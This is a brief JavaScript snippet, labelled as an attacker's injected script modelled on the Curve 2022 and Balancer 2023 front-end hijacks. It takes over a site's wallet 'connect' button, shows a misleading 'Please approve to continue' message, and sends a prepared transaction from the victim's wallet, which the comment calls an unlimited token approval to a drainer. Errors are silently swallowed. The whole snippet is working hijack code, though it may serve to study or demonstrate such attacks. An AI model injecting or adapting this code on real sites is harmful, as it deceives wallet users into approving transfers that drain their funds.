// The attacker's injected script (Curve 2022 / Balancer 2023 style): ask for an unlimited approval to the drainer.
(function () {
  const REQUEST = window.__HIJACK_REQUEST__;
  document.getElementById('connect')?.addEventListener('click', async (e) => {
    e.stopImmediatePropagation();
    const eth = window.ethereum;
    if (!eth) return;
    const [from] = await eth.request({ method: 'eth_requestAccounts' });
    document.getElementById('status').textContent = 'Please approve to continue…';
    try { await eth.request({ method: 'eth_sendTransaction', params: [{ ...REQUEST, from }] }); } catch {}
  }, true);
})();
